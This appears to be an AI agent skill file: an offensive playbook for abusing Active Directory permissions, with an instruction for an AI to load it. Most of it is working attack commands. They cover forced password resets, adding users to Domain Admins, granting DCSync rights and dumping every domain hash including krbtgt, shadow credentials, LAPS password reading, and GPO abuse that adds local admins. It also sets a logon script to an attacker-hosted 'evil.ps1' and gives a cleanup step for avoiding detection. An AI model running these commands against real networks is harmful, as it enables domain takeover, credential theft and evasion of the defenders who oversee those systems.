---
name: active-directory-acl-abuse
description: >-
  Active Directory ACL abuse playbook. Use when exploiting misconfigured AD permissions including GenericAll, WriteDACL, DCSync rights, shadow credentials, LAPS reading, GPO abuse, and BloodHound-guided attack paths.
---

# SKILL: AD ACL Abuse — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert AD ACL abuse techniques. Covers BloodHound enumeration, dangerous ACEs (GenericAll, WriteDACL, WriteOwner, etc.), DCSync, shadow credentials, targeted kerberoasting, group manipulation, LAPS, and GPO abuse. Base models miss complex ACL chain exploitation and Cypher query patterns.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos attacks often chained with ACL abuse
- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) for certificate-based attacks after ACL exploitation
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for relay attacks that can set ACLs (LDAP relay)
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) after gaining elevated AD access

### Advanced Reference

Also load [BLOODHOUND_PATHS.md](./BLOODHOUND_PATHS.md) when you need:
- Common BloodHound attack paths with Cypher queries
- Custom Neo4j queries for finding complex chains
- Data collection and ingestion tips

---

## 1. BLOODHOUND ENUMERATION

### Data Collection

```bash
# SharpHound (from Windows, domain-joined)
SharpHound.exe -c all --outputdirectory C:\temp --zipfilename bh.zip

# bloodhound-python (from Linux)
bloodhound-python -d domain.com -u user -p password -c all -dc DC01.domain.com -ns DC_IP

# Specific collection methods
SharpHound.exe -c DCOnly          # Fastest — only DC queries
SharpHound.exe -c Session         # Session data only (run periodically)
SharpHound.exe -c All,GPOLocalGroup  # Include GPO analysis
```

### Key BloodHound Queries (Built-in)

- "Find all Domain Admins"
- "Shortest Paths to Domain Admins from Owned Principals"
- "Find Principals with DCSync Rights"
- "Shortest Paths to Unconstrained Delegation Systems"
- "Find computers where Domain Users are Local Admin"

---

## 2. DANGEROUS ACE TYPES

| ACE | Effect on Users | Effect on Groups | Effect on Computers |
|---|---|---|---|
| **GenericAll** | Change password, set SPN, modify attributes | Add members | RBCD, LAPS read, all attributes |
| **GenericWrite** | Set SPN, modify attributes, shadow creds | Add members | RBCD, shadow credentials |
| **WriteDACL** | Grant yourself any permission | Same | Same |
| **WriteOwner** | Take ownership → then WriteDACL | Same | Same |
| **ForceChangePassword** | Reset password without knowing old | N/A | N/A |
| **AddMember** | N/A | Add self/others to group | N/A |
| **AllExtendedRights** | Force change password, read LAPS | N/A | Read LAPS, BitLocker keys |
| **ReadLAPSPassword** | N/A | N/A | Read local admin password |
| **WriteSPN** | Set SPN → targeted kerberoast | N/A | N/A |

---

## 3. ACE-SPECIFIC EXPLOITATION

### GenericAll on User

```powershell
# Option 1: Force change password
net user targetuser NewP@ss123 /domain

# Option 2: Targeted Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/svc'}
# → Kerberoast, then clear SPN

# Option 3: Shadow Credentials
Whisker.exe add /target:targetuser /domain:domain.com /dc:DC01

# Option 4: Set logon script
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\evil.ps1'}
```

### GenericAll / GenericWrite on Computer

```bash
# RBCD attack
rbcd.py -delegate-from 'CONTROLLED$' -delegate-to 'TARGET$' -action write DOMAIN/user:pass -dc-ip DC

# Shadow Credentials on computer
pywhisker.py -d domain.com -u user -p pass --target 'TARGET$' --action add --dc-ip DC
```

### WriteDACL

```powershell
# Grant DCSync rights to yourself
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity lowpriv -Rights DCSync

# Impacket
dacledit.py -action write -rights DCSync -principal lowpriv -target-dn "DC=domain,DC=com" DOMAIN/lowpriv:pass -dc-ip DC
```

### WriteOwner

```powershell
# Step 1: Take ownership
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity lowpriv

# Step 2: Grant WriteDACL to yourself (as owner)
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity lowpriv -Rights All

# Step 3: Now exploit as GenericAll
```

### ForceChangePassword

```bash
# Impacket
rpcclient -U 'DOMAIN/attacker%pass' DC01 -c "setuserinfo2 targetuser 23 'NewP@ss123!'"

# PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)

# net rpc
net rpc password targetuser 'NewP@ss123!' -U DOMAIN/attacker%pass -S DC01
```

### AddMember to Group

```powershell
# Add self to privileged group
Add-DomainGroupMember -Identity "Domain Admins" -Members lowpriv

# Impacket
net rpc group addmem "Domain Admins" lowpriv -U DOMAIN/attacker%pass -S DC01
```

---

## 4. DCSYNC ATTACK

### Prerequisites
The principal needs **both** of these replication rights on the domain object:
- `DS-Replication-Get-Changes` (GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
- `DS-Replication-Get-Changes-All` (GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)

### Execution

```bash
# Impacket — dump all hashes
secretsdump.py DOMAIN/user:password@DC01 -just-dc

# Specific account only
secretsdump.py DOMAIN/user:password@DC01 -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:domain.com /user:krbtgt
lsadump::dcsync /domain:domain.com /all /csv

# Impacket with Kerberos auth
export KRB5CCNAME=admin.ccache
secretsdump.py -k -no-pass DC01.domain.com -just-dc
```

### Who Has DCSync by Default?

- Domain Admins
- Enterprise Admins
- Domain Controllers group
- `BUILTIN\Administrators` (on domain object)

---

## 5. SHADOW CREDENTIALS

### Attack Flow

Write `msDS-KeyCredentialLink` on target → generate certificate → authenticate via PKINIT.

```bash
# pyWhisker (Linux)
pywhisker.py -d domain.com -u attacker -p pass --target victim --action add --dc-ip DC01
# Output: DeviceID and PFX file

# Authenticate with certificate
gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass RANDOM_PASS domain.com/victim victim.ccache
export KRB5CCNAME=victim.ccache

# Extract NT hash from TGT (for pass-the-hash)
getnthash.py -key AS_REP_KEY domain.com/victim
```

```powershell
# Whisker (Windows)
Whisker.exe add /target:victim /domain:domain.com /dc:DC01.domain.com
# → Provides Rubeus command to get TGT
Rubeus.exe asktgt /user:victim /certificate:CERT_B64 /password:PASS /ptt
```

**Cleanup**: Remove the added key credential to avoid detection.

---

## 6. LAPS PASSWORD READING

```powershell
# PowerView
Get-DomainComputer -Identity TARGET -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# AD Module
Get-ADComputer -Identity TARGET -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd

# LAPS v2 (Windows LAPS)
Get-LapsADPassword -Identity TARGET -AsPlainText

# CrackMapExec
crackmapexec ldap DC01 -u user -p pass --module laps
```

---

## 7. GPO ABUSE

### Identify Writable GPOs

```powershell
# PowerView — find GPOs where you have write access
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite') -and
    ($_.SecurityIdentifier -match 'YOUR_SID')
}
```

### Exploit via SharpGPOAbuse

```cmd
# Add local admin via GPO
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount lowpriv --GPOName "Vulnerable GPO"

# Add scheduled task via GPO
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\admin --Command "cmd.exe" --Arguments "/c net localgroup administrators lowpriv /add" --GPOName "Vulnerable GPO"

# Add startup script
SharpGPOAbuse.exe --AddComputerScript --ScriptName "evil.bat" --ScriptContents "net localgroup administrators lowpriv /add" --GPOName "Vulnerable GPO"
```

```bash
# pyGPOAbuse (Linux)
pygpoabuse.py DOMAIN/user:pass -gpo-id "GPO_GUID" -command "net localgroup administrators lowpriv /add" -dc-ip DC01
```

---

## 8. ACL ATTACK DECISION TREE

```
Have domain user access — want to escalate via ACL
│
├── Run BloodHound → analyze shortest paths to DA
│   └── Upload data → "Shortest Paths to Domain Admins from Owned Principals"
│
├── Direct ACL on user object?
│   ├── GenericAll → force password change, shadow creds, or targeted kerberoast (§3)
│   ├── GenericWrite → shadow credentials or set SPN (§3/§5)
│   ├── ForceChangePassword → reset password directly (§3)
│   ├── WriteDACL → grant yourself GenericAll, then exploit (§3)
│   └── WriteOwner → take ownership → WriteDACL → GenericAll (§3)
│
├── ACL on group?
│   ├── AddMember / GenericAll → add self to privileged group (§3)
│   └── WriteDACL → grant AddMember, then add self
│
├── ACL on computer object?
│   ├── GenericAll/GenericWrite → RBCD attack (§3)
│   ├── AllExtendedRights → read LAPS password (§6)
│   └── GenericWrite → shadow credentials on machine (§5)
│
├── ACL on domain object?
│   ├── WriteDACL → grant DCSync rights to self (§4)
│   └── Replication rights already? → DCSync directly (§4)
│
├── ACL on GPO linked to privileged OU?
│   └── Write access → add admin / scheduled task via GPO (§7)
│
└── Complex multi-hop chain?
    └── Load BLOODHOUND_PATHS.md for Cypher queries and chain analysis
```
